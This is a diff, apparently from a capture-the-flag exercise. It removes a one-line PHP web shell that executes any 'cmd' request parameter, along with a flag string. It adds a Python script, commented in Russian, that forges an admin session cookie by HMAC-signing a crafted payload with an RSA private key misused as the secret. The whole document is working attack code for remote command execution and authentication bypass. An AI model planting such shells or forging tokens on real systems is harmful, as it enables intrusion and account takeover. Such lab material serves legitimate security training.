@@ -1,5 +1,38 @@
-<?php
-if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); }
-echo "AAAABBBBCCCCDDDD";
-?>
-THM{hash_puppies_4_all}
+import hmac
+import hashlib
+import base64
+import time
+import struct
+
+# ВСТАВЬ СЮДА СВОЙ ПРИВАТНЫЙ КЛЮЧ (ВЕСЬ ТЕКСТ ЦЕЛИКОМ)
+# Сохрани переносы строк и дефисы!
+SECRET_KEY = """-----BEGIN PRIVATE KEY-----
+MIIBu... (скопируй всё содержимое оттуда) ...
+...
+-----END PRIVATE KEY-----"""
+
+def forge_token():
+    # 1. Создаем пэйлоад для Админа
+    header = '{"username": "admin"}'
+    # Кодируем в URL-safe Base64
+    part1 = base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')
+
+    # 2. Создаем метку времени (как на сайте)
+    # Используем текущее время
+    ts = int(time.time())
+    # Упаковываем в 4 байта (Big Endian), как делает сервер (aZCbaw -> timestamp)
+    part2 = base64.urlsafe_b64encode(struct.pack('>I', ts)).decode().rstrip('=')
+
+    # 3. Собираем данные для подписи
+    msg = f"{part1}.{part2}"
+
+    # 4. Подписываем (HMAC-SHA1), используя Приватный Ключ как ПАРОЛЬ
+    # (Сайт ошибочно использует RSA ключ как строку-секрет для HMAC)
+    signature = hmac.new(SECRET_KEY.encode(), msg.encode(), hashlib.sha1).digest()
+    part3 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
+
+    # 5. Результат
+    print(f"\n[+] FORGED COOKIE: {msg}.{part3}")
+
+if __name__ == "__main__":
+    forge_token()
